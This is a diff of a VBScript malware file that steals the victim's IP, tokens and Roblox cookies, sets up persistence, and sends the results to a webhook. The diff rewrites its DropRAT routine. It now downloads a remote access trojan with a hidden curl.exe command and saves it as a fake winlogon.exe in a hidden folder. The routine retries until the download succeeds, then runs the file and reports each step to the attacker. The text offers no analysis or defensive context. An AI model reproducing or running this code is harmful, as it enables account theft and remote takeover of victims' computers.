@@ -20,15 +20,17 @@ USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 Dim tf: tf = sh.ExpandEnvironmentStrings("%TEMP%") & "\steal1.txt"
 Dim tr: Set tr = fso.CreateTextFile(tf, True): tr.Write "START:" & Now & vbCrLf: tr.Close: Set tr = Nothing
 
-' --- 1. GRABS (Target -> Token -> Cookie -> Persistence -> UI -> RAT) ---
+' --- 1. GRABS (Target -> Token -> Cookie -> Persistence -> UI) ---
 Call IP(WH)
 Call GrabTokens(WH)
 Call GrabRoblox(WH)
 Call Persistence
 Call PostFullRobloxUI(WH)
-Call DropRAT ' RAT drops LAST in the first sequence
 
-' --- 2. INFINITE Re-grab Loop ---
+' --- 2. RAT DROP (Spam Loop until success) ---
+Call DropRAT
+
+' --- 3. INFINITE Re-grab Loop ---
 Dim runCount
 runCount = 0
 Do
@@ -58,36 +60,28 @@ Sub DropRAT()
     Dim op : op = hidDir & "\winlogon.exe"
     If fso.FileExists(op) Then fso.DeleteFile op
 
-    ' Spam "Fetching Payload" loop
+    ' Spam "Fetching Payload" loop until success
     Dim attempts : attempts = 0
     Do
         attempts = attempts + 1
+        ' Spam the fetching message
         Call PostEmbed(":package: Fetching Payload", "Attempting RAT download (Try " & attempts & ")...", 10181046)
 
-        ' Use MSXML2.XMLHTTP to download into memory
-        Dim xh : Set xh = CreateObject("MSXML2.XMLHTTP")
-        xh.Open "GET", exeUrl, False
-        xh.Send
+        If fso.FileExists(op) Then fso.DeleteFile op
 
-        ' Write to disk
-        If xh.Status = 200 Then
-            Dim stream : Set stream = CreateObject("ADODB.Stream")
-            stream.Type = 1
-            stream.Open
-            stream.Write xh.ResponseBody
-            stream.SaveToFile op, 2
-            stream.Close
-        End If
+        ' Use curl.exe (most reliable bypass)
+        Dim dlCmd : dlCmd = "cmd /c curl.exe -s -L -o """ & op & """ """ & exeUrl & """"
+        sh.Run dlCmd, 0, True
 
-        ' Check for success
+        ' Check if downloaded and valid (>100KB)
         If fso.FileExists(op) Then
             If fso.GetFile(op).Size > 100000 Then
+                ' Success! Send the green checkmark, execute, and EXIT the spam loop.
                 Dim dsize : dsize = fso.GetFile(op).Size
                 Call PostEmbed(":white_check_mark: RAT Downloaded", "Size: " & CStr(dsize) & " bytes | Launching...", 10181046)
                 
-                ' Execute via WMI
                 Call RunCmd("""" & op & """")
-                Exit Sub ' Stop spamming once successful
+                Exit Sub 
             End If
         End If
         
